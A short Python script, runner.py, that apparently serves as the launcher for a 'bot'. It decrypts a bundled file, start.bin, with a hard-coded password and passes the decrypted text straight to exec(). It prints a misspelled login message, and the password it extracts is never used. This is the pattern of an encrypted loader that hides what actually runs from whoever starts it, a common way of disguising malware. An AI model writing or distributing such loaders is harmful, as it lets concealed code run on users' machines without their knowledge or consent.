# runner.py
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
import os

def decrypt_file(file_path, password):
    # Read the encrypted file
    with open(file_path, 'rb') as f:
        data = f.read()

    # Extract the salt, IV, and ciphertext
    salt = data[:16]
    iv = data[16:32]
    ciphertext = data[32:]

    # Derive the key from the password using Scrypt
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1, backend=default_backend())
    key = kdf.derive(password.encode('utf-8'))

    # Decrypt the ciphertext
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    return plaintext

if __name__ == "__main__":
    # List of possible codecs to try
    codecs_to_try = ['utf-8', 'latin-1', 'ascii']  # Add more if needed

    decrypted_content = None
    for codec in codecs_to_try:
        try:
            decrypted_content = decrypt_file('start.bin', '22784').decode(codec)
            break  # If decoding succeeds, exit the loop
        except UnicodeDecodeError:
            continue  # If decoding fails, try the next codec

    if decrypted_content is None:
        print("Failed to decode the decrypted content using any of the specified codecs.")
    else:
        # Extract password from the decrypted content
        password_start_index = decrypted_content.rfind("# Password\n") + len("# Password\n")
        password = decrypted_content[password_start_index:].strip()

        # Use the extracted password for login
        print("Logged in and yoyr bot has been started:")

        # Remove null bytes from the decrypted content
        decrypted_content_cleaned = decrypted_content.replace("\x00", "")

        # Execute the cleaned decrypted code without password prompt
        exec(decrypted_content_cleaned)
